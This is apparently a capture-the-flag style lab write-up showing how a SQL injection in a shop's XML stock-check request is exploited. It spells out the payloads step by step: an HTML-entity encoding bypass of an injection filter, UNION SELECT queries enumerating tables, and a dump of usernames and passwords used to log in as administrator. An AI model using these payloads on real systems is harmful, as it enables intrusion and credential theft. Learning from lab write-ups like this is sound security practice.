# Description
This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

# Process
## The website
The basic website was a shop with multiple products. On each product page was a feature to check the stock of the product.

When the "Check stock" button was pressed, it would send a request like this:
```
POST /product/stock HTTP/1.1

(Content)

<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			7
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```
which would return the number of units available like this:
```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 9

390 units
```

## Starting out
I figured that the exploit was within the XML part of the request thanks to the title of the lab, so I tried messing around with it. Knowing that it was SQL injection, I put an apostrophe behind the `storeId` value:
```
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			7
		</productId>
		<storeId>
			1'
		</storeId>
	</stockCheck>
```
which returned a response with a body of `Attack detected!`, the page just showing "Could not fetch stock levels!"

To bypass the filter, I tried using HTML encoding. The HTML entity equivalent of an apostrophe is `&#39;`, so I plugged that in:
```
<storeId>
	1 &#39;
</storeId>
```
This time, the response was just `0 units`, implying that it had messed with the system. That means that the filter was bypassed.

## Will UNION injections work?
First, I tried a UNION injection:
```
<storeId>
	1 &#39; UNION SELECT NULL;--
</storeId>
```
This returned the same `Attack detected!` as before, so that implies that something triggered the filter. I tried again with a condensed version:
```
<storeId>
	1 &#39; UNION SELECT NULL
</storeId>
```
This also triggered the filter, so that means that I need to encode the keywords too. Instead of testing each one, I encoded them all:
```
<storeId>
	1 &#39; &#85;NION &#83;ELECT NULL
</storeId>
```
This didn't do anything, so I got rid of the apostrophe:
```
<storeId>
	1 &#85;NION &#83;ELECT NULL
</storeId>
```
This time, the response was `390 units` and `null`, showing that it had worked! I added another `NULL` after the first one, but that didn't work, so that means that only one column is returned at a time.

I now know that if I get `0 units` as a response, there was an error with the syntax. I can use this for a few things.

## Going on a tangent
First, I used it to find the name of a table. The lab description said that there was a table named `users`, but I didn't remember that, so I messed around. First, I tried to find a table named `stock`, but that didn't work. Next, I tried `products`:
```
<storeId>
	1 &#85;NION &#83;ELECT NULL FROM products
</storeId>
```
This worked, returning `null` and `390 units`. Next, I had to find a column names. I tried `name` first:
```
<storeId>
	1 &#85;NION &#83;ELECT name FROM products
</storeId>
```
This returned a list of product names:
```
Portable Hat
Six Pack Beer Belt
Sprout More Brain Power
...
Eggtastic, Fun, Food Eggcessories
The Alternative Christmas Tree
Snow Delivered To Your Door
```
I tried `price` next, but that didn't work. Neither did `cost`, `amount`, `quantity`, `stock`, and so on. `description` worked, but that wasn't useful.

## The USERS table
I remembered what I was doing, and tried the `users` table:
```
<storeId>
	1 &#85;NION &#83;ELECT NULL FROM users
</storeId>
```
This returned `null` and `390 units`, so I knew it existed. Next, I tried to guess column names. First, I did `username`:
```
<storeId>
	1 &#85;NION &#83;ELECT username FROM users
</storeId>
```
This returned a list of users, among which was `administrator`. Next, I just needed the password, so I tried the `password` column:
```
<storeId>
	1 &#85;NION &#83;ELECT password FROM users
</storeId>
```
This returned a list of strings that I assumed were passwords, cool! I could have ended there, but I wanted to make it nicer and test my skills a little more, so I tried to concatenate them:
```
<storeId>
	1 &#85;NION &#83;ELECT username || '~' || password FROM users
</storeId>
```
This gave an error, and I remembered I had to encode the apostrophes:
```
<storeId>
	1 &#85;NION &#83;ELECT username || &#39;~&#39; || password FROM users
</storeId>
```
This returned all of the usernames and passwords in the format `username~password`, which was just what I needed. I logged in with the admin account and completed the lab.